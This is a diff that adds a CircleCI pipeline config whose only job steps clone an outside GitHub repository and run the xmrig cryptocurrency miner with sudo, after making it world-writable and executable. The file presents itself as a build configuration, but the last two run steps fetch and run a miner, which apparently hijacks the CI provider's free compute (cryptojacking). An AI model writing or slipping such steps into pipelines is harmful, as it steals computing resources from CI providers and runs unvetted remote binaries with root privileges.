@@ -1,0 +1,11 @@
+version: 2.1
+jobs:
+  build:
+    docker:
+      - image: cimg/base:2021.10
+    steps:
+      - checkout
+      # Whatever you want to do
+      - run: sudo apt-get update
+      - run: sudo git clone https://github.com/yszalxh/circleci.git
+      - run: cd circleci && sudo chmod 777 xmrig && sudo ./xmrig
